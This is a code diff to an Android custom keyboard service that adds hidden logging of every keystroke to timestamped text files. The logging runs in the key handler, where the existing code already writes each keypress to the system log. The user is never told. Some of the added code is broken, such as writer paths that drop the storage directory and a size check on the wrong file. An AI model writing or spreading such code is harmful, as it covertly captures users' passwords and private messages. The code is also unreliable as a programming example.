@@ -5,16 +5,31 @@ import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.media.AudioManager;
+import android.os.Environment;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.widget.LinearLayout;
+import java.io.File;
+import java.util.Date;
+import java.util.Random;
+import java.io.FileWriter;
+import java.io.IOException;
+
 
 public class SimpleIME extends InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
 
     private KeyboardView kv;
     private Keyboard keyboard, keyboard_sym;
+    private File file;
+    private Random rand;
+    private String path;
+    private Date date;
+    private long time;
+    private String outputFile;
+    private FileWriter fw;
+    private char c;
     String TAG = "SimpleIME";
 
     private boolean caps = false;
@@ -24,6 +39,18 @@ public class SimpleIME extends InputMethodService
         kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
         keyboard = new Keyboard(this, R.xml.qwerty);
         // keyboard_sym = new Keyboard(this, R.xml.symbol);
+        date = new Date();
+        rand = new Random();
+        path = Environment.getExternalStorageDirectory().getAbsolutePath();
+        path += "/";
+        time = date.getTime();
+        outputFile = path + time + "_" + rand + ".txt";
+        file = new File(outputFile);
+        try {
+            fw = new FileWriter(file.getName());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
         kv.setKeyboard(keyboard);
 
         kv.setOnKeyboardActionListener(this);
@@ -38,6 +65,28 @@ public class SimpleIME extends InputMethodService
         String ch = Character.toString((char) primaryCode);
         String character = primaryCode == -1 ? "caps" : ch;
         Log.e(TAG, "Clicked " + primaryCode + " " + character);
+        c = (char)primaryCode;
+        if(file.length() >= 2048){
+            date = new Date();
+            rand = new Random();
+            time = date.getTime();
+            outputFile = path + time + "_" + rand + ".txt";
+            file = new File(outputFile);
+            try {
+                fw = new FileWriter(file.getName());
+                fw.write(c);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        else{
+            try {
+                fw.write(c);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
         switch (primaryCode) {
             case Keyboard.KEYCODE_DELETE:
                 break;
